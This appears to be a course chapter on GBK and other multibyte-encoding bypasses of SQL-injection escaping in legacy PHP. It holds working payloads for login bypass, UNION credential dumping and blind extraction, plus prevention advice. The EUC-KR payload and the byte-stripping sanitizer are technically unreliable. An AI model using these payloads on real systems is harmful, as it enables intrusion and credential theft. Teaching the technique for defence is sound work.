# 20 - Multibyte Encoding Bypass

## Overview

Multibyte encoding bypass exploits character set handling differences to bypass SQL injection filters. This technique primarily affects legacy PHP applications using non-UTF-8 encodings like GBK (Chinese character set).

## Understanding Character Sets

### Single-Byte vs Multibyte Encodings

| Encoding Type | Examples                   | Character Size     |
| ------------- | -------------------------- | ------------------ |
| Single-byte   | ASCII, Latin1 (ISO-8859-1) | 1 byte per char    |
| Multibyte     | UTF-8, GBK, Big5           | 2-4 bytes per char |

### How Multibyte Encoding Works

**UTF-8 (Variable length):**

- ASCII chars: 1 byte (0x00-0x7F)
- Extended: 2-4 bytes

**GBK (Chinese encoding):**

- ASCII compatible: 1 byte (0x00-0x7F)
- Chinese chars: 2 bytes (0x81-0xFE + second byte)

### The Vulnerability

When different components use different character sets:

| Component | Character Set | Action          |
| --------- | ------------- | --------------- |
| Browser   | UTF-8         | Sends request   |
| Server    | GBK           | Processes input |
| Database  | GBK           | Executes query  |

**The Mismatch:** Server interprets UTF-8 bytes as GBK, causing character boundary confusion.

## The GBK Injection Technique

### The Magic Bytes: 0xBF27

**Byte sequence:** `0xBF 0x27`

**How it works:**

| Context    | Interpretation                     |
| ---------- | ---------------------------------- |
| **GBK**    | Single multibyte character (legal) |
| **Latin1** | `¿'` (0xBF = ¿, 0x27 = ')          |

### Attack Flow

| Step | Action                     | Result                         |
| ---- | -------------------------- | ------------------------------ |
| 1    | Attacker sends 0xBF27      | Magic bytes injected           |
| 2    | Server receives as GBK     | Interprets as single character |
| 3    | mysql_real_escape_string() | Adds backslash: 0xBF5C27       |
| 4    | Database interprets 0xBF5C | As single GBK character        |
| 5    | 0x27 becomes unescaped     | Quote is now FREE              |
| 6    | SQL injection              | Payload executes successfully  |

### Visual Representation

**Normal Escaping (Safe):**

```
Input:  '
Escape: \
Result: \'  ← Backslash escapes quote
```

**Multibyte Bypass (Vulnerable):**

```
Input:  BF 27  (¿')
Escape: BF 5C 27  (¿\')
GBK:    [BF5C] [27]  ← BF5C is one char, 27 is unescaped '
Result: ¿\'  ← Quote is FREE!
```

## Practical Payloads

### Basic GBK Bypass

**Payload:**

```python
# Python to generate payload
payload = b'\xbf\x27 OR 1=1-- '
```

**Result:**

```sql
SELECT * FROM users WHERE name = '¿\' OR 1=1-- '
-- Database sees: ... WHERE name = '[BF5C]' OR 1=1-- '
```

### URL-Encoded Version

**Payload:**

```
%BF%27%20%4F%52%20%31%3D%31%2D%2D%20
```

**Decodes to:**

```
¿' OR 1=1--
```

### Full Exploitation Payload

**Authentication Bypass:**

```python
# Username field
username = b'\xbf\x27 OR 1=1 LIMIT 1-- \x27'
```

**Query:**

```sql
SELECT * FROM users WHERE username = '¿\' OR 1=1 LIMIT 1-- '' AND password = '...'
```

## Other Multibyte Encodings

### Big5 (Traditional Chinese)

**Magic Bytes:** Similar GBK technique

**Payload:**

```python
payload = b'\xa1\x27 OR 1=1-- '
```

### Shift-JIS (Japanese)

**Vulnerable Sequences:**

```python
# 0x81-0x9F and 0xE0-0xFC are first bytes
payload = b'\x81\x27 OR 1=1-- '
```

### EUC-KR (Korean)

**Similar approach:**

```python
payload = b'\xa1\x27 OR 1=1-- '
```

## Detection

### Identify Vulnerable Applications

**Indicators:**

- Legacy PHP applications
- `mysql_set_charset('gbk')` in code
- `SET NAMES gbk` in database
- Chinese/Japanese/Korean language content

**Code Patterns:**

```php
// Vulnerable pattern
mysql_query("SET NAMES gbk");
mysql_real_escape_string($input);
```

### Test for Vulnerability

**Step 1: Check Character Set**

```sql
-- Check database charset
SHOW VARIABLES LIKE 'character_set%';
```

**Step 2: Send Test Payload**

```
%BF%27
```

**Step 3: Observe Error Messages**

| Response             | Meaning                       |
| -------------------- | ----------------------------- |
| MySQL error near `'` | Quote escaped properly (safe) |
| Syntax error at end  | Quote consumed (vulnerable!)  |
| No error             | Check if injection succeeded  |

## Exploitation Techniques

### Technique 1: Union Injection

**Payload:**

```python
username = b'\xbf\x27 UNION SELECT 1,2,3-- '
```

**Query:**

```sql
SELECT * FROM users WHERE username = '[BF5C]' UNION SELECT 1,2,3-- ''
```

### Technique 2: Boolean-Based Blind

**True Condition:**

```python
username = b'\xbf\x27 AND 1=1-- '
```

**False Condition:**

```python
username = b'\xbf\x27 AND 1=2-- '
```

### Technique 3: Time-Based Blind

**MySQL:**

```python
username = b'\xbf\x27 AND SLEEP(5)-- '
```

**PostgreSQL:**

```python
username = b'\xbf\x27 AND pg_sleep(5)-- '
```

## Prevention

### Use UTF-8 Consistently

**Database:**

```sql
-- Set UTF-8 for all connections
SET NAMES utf8mb4;
ALTER DATABASE mydb CHARACTER SET utf8mb4;
```

**Application (PHP):**

```php
// Use UTF-8
mysqli_set_charset($conn, "utf8mb4");

// Or PDO
$dsn = "mysql:host=localhost;dbname=mydb;charset=utf8mb4";
```

### Use Prepared Statements

**PHP PDO (Safe regardless of charset):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$username]);  // Safe from multibyte bypass
```

**PHP MySQLi (Safe):**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE name = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### Validate Input Encoding

```php
function validate_utf8($string) {
    return mb_check_encoding($string, 'UTF-8');
}

if (!validate_utf8($user_input)) {
    die("Invalid encoding");
}
```

### Remove Magic Bytes

```php
function sanitize_multibyte($input) {
    // Remove dangerous GBK sequences
    $dangerous = array("\xbf", "\xc0", "\xc1");
    return str_replace($dangerous, "", $input);
}
```

## Real-World Examples

### Example 1: Chinese CMS

**Vulnerable Code:**

```php
// Common in Chinese PHP CMS
mysql_query("SET NAMES gbk");
$username = mysql_real_escape_string($_GET['user']);
$query = "SELECT * FROM admin WHERE username = '$username'";
```

**Exploit:**

```
GET /login.php?user=%BF%27%20OR%201=1--%20
```

**Result:** Authentication bypass

### Example 2: Japanese E-Commerce

**Vulnerable Code:**

```php
// Shift-JIS encoding
mb_convert_encoding($input, "SJIS", "auto");
$query = "SELECT * FROM products WHERE name LIKE '%$input%'";
```

**Exploit:**

```python
payload = b'\x81\x27%20UNION%20SELECT%20*%20FROM%20admin--%20'
```

## Practice Exercises

### Exercise 1: GBK Bypass

**Setup:**

- PHP application with `SET NAMES gbk`
- Login form with username/password

**Task:**

1. Identify GBK encoding
2. Send multibyte payload
3. Bypass authentication

**Payload:**

```
Username: %BF%27 OR 1=1--
Password: anything
```

### Exercise 2: Union Extraction

**Setup:**

- Search function using GBK
- Vulnerable to multibyte bypass

**Task:**

1. Confirm multibyte injection
2. Extract column count
3. Dump admin credentials

**Payload:**

```python
search = b'\xbf\x27 UNION SELECT username,password FROM admin-- '
```

### Exercise 3: Blind Extraction

**Setup:**

- Blind SQL injection via multibyte
- No error messages

**Task:**

1. Use time-based detection
2. Confirm injection with delays
3. Extract data character by character

**Payload:**

```python
# Test for 'a'
username = b'\xbf\x27 AND (SELECT SUBSTRING(password,1,1) FROM admin) = CHAR(97)-- '
```

## Key Takeaways

1. **Multibyte encodings can bypass escaping** - Character set confusion
2. **GBK 0xBF27 is the classic bypass** - Creates valid multibyte char
3. **UTF-8 is the defense** - Consistent encoding prevents bypass
4. **Prepared statements always safe** - Regardless of encoding
5. **Legacy PHP apps most at risk** - Modern apps use UTF-8

## Legacy Note

This vulnerability primarily affects:

- PHP 5.x with `mysql_*` functions
- Applications using GBK/Big5/Shift-JIS
- Legacy systems not updated to UTF-8

Modern applications using UTF-8 consistently and prepared statements are not vulnerable to this specific attack vector.

## Next Step

Continue to [21 - NoSQL Injection](21-NoSQL-Injection.md) to learn about non-relational database injection techniques.
